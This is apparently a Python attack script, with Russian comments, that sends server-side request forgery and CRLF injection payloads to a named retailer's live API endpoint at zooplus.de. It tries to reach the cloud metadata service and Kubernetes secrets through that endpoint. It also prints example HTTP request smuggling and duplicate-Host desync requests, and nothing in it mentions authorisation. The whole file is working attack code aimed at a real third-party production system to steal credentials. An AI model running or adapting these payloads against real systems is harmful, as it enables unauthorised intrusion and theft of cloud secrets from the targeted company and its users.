#!/usr/bin/env python3
"""
HAIL MARY #3: HTTP/2 Request Smuggling + SSRF
Вероятность: 1-2%

Теория:
- CloudFront может неправильно обрабатывать HTTP/2 pseudo-headers
- :path, :authority могут быть использованы для обхода WAF
- HTTP/2 request splitting через CRLF в headers
"""

import requests
import time
import json

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("HAIL MARY #3: HTTP/2 Request Smuggling")
print("Вероятность успеха: 1-2%")
print("="*80)

# Test 1: HTTP/2 pseudo-headers injection
print("\n[TEST 1] HTTP/2 :authority header injection")
print("-" * 80)

# Попробуем заставить CloudFront маршрутизировать через другой backend
test_cases = [
    # Обычный SSRF
    ("http://169.254.169.254/latest/meta-data/",
     {},
     "Normal SSRF"),

    # Попробуем добавить :authority header для HTTP/2
    ("http://169.254.169.254/latest/meta-data/",
     {':authority': '169.254.169.254'},
     "With :authority header"),

    # Host header manipulation (HTTP/1.1 to HTTP/2 downgrade attack)
    ("http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
     {'Host': 'kubernetes.default.svc'},
     "Host header manipulation"),
]

for url, headers, description in test_cases:
    print(f"\n[*] {description}")
    print(f"    URL: {url}")
    if headers:
        print(f"    Extra headers: {headers}")

    try:
        start = time.time()
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            headers=headers,
            timeout=10,
            verify=False
        )
        elapsed = (time.time() - start) * 1000

        print(f"    Status: {resp.status_code}")
        print(f"    Timing: {elapsed:.1f}ms")
        print(f"    Response length: {len(resp.text)}")

        if len(resp.text) > 10:
            print(f"    [!!!] Non-empty response!")
            print(f"    {resp.text[:200]}")

    except Exception as e:
        print(f"    Error: {e}")

# Test 2: CRLF injection для HTTP request splitting
print("\n\n[TEST 2] CRLF injection в URL parameter")
print("-" * 80)

# Попробуем внедрить дополнительный запрос через CRLF
crlf_payloads = [
    # Попытка внедрить второй запрос
    "http://safe.com/%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/latest/meta-data/",

    # CRLF в параметре
    "http://safe.com/?x=%0d%0aHost:%20169.254.169.254",

    # CRLF в path
    "http://safe.com/%0d%0aX-Forwarded-Host:%20169.254.169.254",
]

for payload in crlf_payloads:
    print(f"\n[*] Testing CRLF: {payload[:80]}...")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": payload},
            timeout=10,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:100]}")

        if resp.status_code != 200:
            print(f"    [!] Different status code!")

    except Exception as e:
        print(f"    Error: {e}")

# Test 3: HTTP/2 :path smuggling
print("\n\n[TEST 3] Content-Length / Transfer-Encoding conflicts")
print("-" * 80)

print("""
[!] Для этого теста нужно отправить conflicting headers:

Content-Length: 100
Transfer-Encoding: chunked

С body, который интерпретируется по-разному CloudFront vs backend.

Пример (требует raw socket):

POST /zootopia-events/api/events/sites/1 HTTP/1.1
Host: www.zooplus.de
Content-Type: application/json
Content-Length: 100
Transfer-Encoding: chunked

{"url": "http://safe.com"}
0

POST /internal/admin HTTP/1.1
Host: 169.254.169.254
...

НО: Это требует raw HTTP, не работает через requests library.
Вероятность: <1%
""")

# Test 4: Multiple Host headers
print("\n\n[TEST 4] Multiple Host headers (HTTP Desync)")
print("-" * 80)

print("""
[!] Некоторые proxy серверы берут первый Host header, другие - последний.

Можно попробовать:

POST /zootopia-events/api/events/sites/1 HTTP/1.1
Host: www.zooplus.de
Host: 169.254.169.254
Content-Type: application/json

{"url": "http://anything"}

НО: requests library не позволяет дублировать Host header.
Нужен raw socket или специальный HTTP client.
""")

# Попробуем через requests с кастомным header
try:
    print("\n[*] Testing duplicate Host header (requests limitation)...")

    # requests не позволяет дублировать Host, но можем попробовать подделку
    from requests.structures import CaseInsensitiveDict

    headers = CaseInsensitiveDict({
        'Host': 'www.zooplus.de, 169.254.169.254',  # Multiple hosts в одном header
    })

    resp = requests.post(
        ENDPOINT,
        json={"url": "http://kubernetes.default.svc/api/v1/secrets"},
        headers=headers,
        timeout=10,
        verify=False
    )

    print(f"    Status: {resp.status_code}")
    print(f"    Response: {resp.text[:100]}")

except Exception as e:
    print(f"    Error: {e}")

print("\n" + "="*80)
print("ВЫВОД")
print("="*80)

print("""
HTTP/2 Request Smuggling работает ТОЛЬКО если:
1. CloudFront неправильно обрабатывает HTTP/2 headers
2. Есть Content-Length/Transfer-Encoding desync
3. Backend vulnerable to request splitting

Вероятность: 1-2%

Реалистично протестировать только:
- CRLF injection (done above)
- Host header manipulation (done above)

Для полного теста нужен:
- Raw socket implementation
- HTTP/2 smuggling tools (h2csmuggler)
- Burp Suite Pro (HTTP Request Smuggling scanner)

Если все тесты выше вернули пустые {} → НЕ работает

Рекомендация:
Если нет Burp Suite Pro → ПРОПУСТИТЕ этот метод
""")
